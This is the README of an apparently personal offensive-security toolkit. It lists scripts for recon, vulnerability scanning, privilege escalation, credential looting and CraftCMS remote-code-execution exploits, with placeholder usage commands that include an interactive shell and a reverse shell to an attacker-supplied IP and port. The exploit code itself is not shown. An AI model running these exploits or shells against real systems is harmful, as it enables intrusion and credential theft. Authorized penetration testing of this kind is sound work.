# toolkit

Offensive security scripts for recon, exploitation, and post-ex. Organized by attack phase. Generic — no hardcoded targets.

## Contents

- [Structure](#structure)
- [How to Run](#how-to-run)
  - [Scan](#scan)
  - [Recon](#recon)
  - [Exploit](#exploit)
- [Rules](#rules)

---

## Structure

```
toolkit/
├── scan/scripts/         # Full pipeline: recon + active vuln scanning
├── recon/scripts/        # Enumeration: nmap, gobuster, vhost, CVE fingerprinting
├── exploit/scripts/      # Vulnerability exploitation: CVE PoCs, web attacks
├── execution/scripts/    # Code execution, shell spawning, payload delivery
├── privesc/scripts/      # Privilege escalation: sudo, SUID, cron, kernel
└── loot/scripts/         # Credential dumping, file exfil, post-exploitation
```

---

## How to Run

Replace `<TARGET>`, `<IP>`, `<URL>` with your actual values. Never commit real targets.

### Scan

Full recon pipeline: subdomain enum → live hosts → historical URLs → gf pattern match → active vuln scan.

| Script | What it does |
|--------|-------------|
| [recon_phase.sh](scan/scripts/recon_phase.sh) | 6-phase recon + vuln scan pipeline. Runs subfinder → httpx → gau → gf → vuln_scan.py → summary |
| [vuln_scan.py](scan/scripts/vuln_scan.py) | Active vuln scanner: SQLi, XSS, SSRF, LFI, CMDi, SSTI, IDOR, XXE, JWT weakness, cookie dissection, info disclosure, CORS, open redirect |
| [securitytxt_finder.py](scan/scripts/securitytxt_finder.py) | Find targets via security.txt (RFC 9116) — filters out platforms, surfaces off-platform VDPs |

```bash
# Full pipeline — runs all 6 phases
bash scan/scripts/recon_phase.sh <TARGET_DOMAIN>

# Active vuln scan only (single URL)
python3 scan/scripts/vuln_scan.py <URL>
python3 scan/scripts/vuln_scan.py <URL> --no-crawl
python3 scan/scripts/vuln_scan.py <URL> -k --auth-bearer <TOKEN>
python3 scan/scripts/vuln_scan.py <URL> --auth-header "Cookie: session=<VALUE>"
python3 scan/scripts/vuln_scan.py -f urls.txt

# Find targets with security.txt not on major platforms
python3 scan/scripts/securitytxt_finder.py --domain <DOMAIN>
python3 scan/scripts/securitytxt_finder.py --domains domains.txt --output results.json
```

**vuln_scan.py checks:**
- Injections: SQLi (error + blind time-based), NoSQLi, XSS, LFI, CMDi, SSTI, SSRF, IDOR, XXE
- JWT: alg:none bypass, weak secret cracking, missing `exp`, privilege fields, algorithm confusion
- Cookies: Secure/HttpOnly/SameSite flags, full value dissection (JWT/base64/JSON/hex decode), entropy check
- Info disclosure: 40+ sensitive paths (.env, .git, phpinfo, actuator, swagger), secret pattern matching (AWS keys, GitHub tokens, DB strings, internal IPs, stack traces)
- Headers: HSTS, CSP, X-Frame-Options, Referrer-Policy
- CORS: origin reflection + credentials
- Open redirect

---

### Recon

| Script | What it does |
|--------|-------------|
| [deeprecon.py](recon/scripts/deeprecon.py) | **Full deep recon from a single IP** — nmap all ports, service enum, CVE lookup (searchsploit + NVD), auto /etc/hosts, clickable URLs, launches vuln_scan.py |
| [recon.sh](recon/scripts/recon.sh) | Nmap fast + detailed + gobuster + nikto + whatweb |
| [web_enum.sh](recon/scripts/web_enum.sh) | Web enum — headers, links, vhost fuzz, sensitive paths |
| [cve_detect.sh](recon/scripts/cve_detect.sh) | CMS fingerprint (CraftCMS, WordPress, Drupal, Laravel) + CVE suggestions |

```bash
# Deep recon — everything from one IP (start here)
python3 recon/scripts/deeprecon.py <IP>
python3 recon/scripts/deeprecon.py <IP> <HOSTNAME>

# Basic nmap + web recon
bash recon/scripts/recon.sh <IP> <HOSTNAME>

# Web enumeration only
bash recon/scripts/web_enum.sh <URL>
bash recon/scripts/web_enum.sh <URL> <OUTPUT_DIR>

# CMS fingerprint + CVE suggestions
bash recon/scripts/cve_detect.sh <IP> <HOSTNAME>
```

**deeprecon.py covers:**
- Phase 1: Fast full-port scan (all 65535 ports, `--min-rate 5000`)
- Phase 2: Detailed service/version/OS/vuln scan on open ports
- Phase 3: Service-specific enum — web (gobuster + sensitive paths + headers), SSH, FTP, SMB, DNS, SMTP, SNMP, Redis, MySQL, NFS, MongoDB
- Phase 4: CVE lookup — searchsploit for each detected version, optional NVD API for CVSS scores (set `NVD_API_KEY` env var)
- Phase 5: Summary — port table, web paths, flagged findings, CVEs found, next steps, Markdown report

---

### Exploit

| Script | What it does |
|--------|-------------|
| [craft_cve_2023_41892.sh](exploit/scripts/craft_cve_2023_41892.sh) | CVE-2023-41892 — CraftCMS unauthenticated RCE via SSTI (bash, affects 4.x < 4.4.15) |
| [craft_cve_2023_41892.py](exploit/scripts/craft_cve_2023_41892.py) | CVE-2023-41892 — CraftCMS unauthenticated RCE via SSTI (Python, affects 4.x < 4.4.15) |
| [craft_cve_2025_32432.py](exploit/scripts/craft_cve_2025_32432.py) | CVE-2025-32432 — CraftCMS 5.x pre-auth RCE via Yii object config + PhpManager session file injection |

```bash
# CVE-2023-41892 — CraftCMS unauthenticated RCE (affects 4.x < 4.4.15)
bash exploit/scripts/craft_cve_2023_41892.sh <URL> "<command>"
python3 exploit/scripts/craft_cve_2023_41892.py <URL> "<command>"

# CVE-2025-32432 — CraftCMS 5.x pre-auth RCE (affects 5.x < 5.6.17)
python3 exploit/scripts/craft_cve_2025_32432.py <URL>                        # id check
python3 exploit/scripts/craft_cve_2025_32432.py <URL> "<command>"            # single command
python3 exploit/scripts/craft_cve_2025_32432.py <URL> --shell                # interactive shell
python3 exploit/scripts/craft_cve_2025_32432.py <URL> --revshell <IP> <PORT> # reverse shell
```

---

## Rules

- Authorized targets only
- Max 5 req/sec on all requests
- No destructive testing without explicit authorization
- Never commit real IPs, hostnames, credentials, or personal paths to this repo
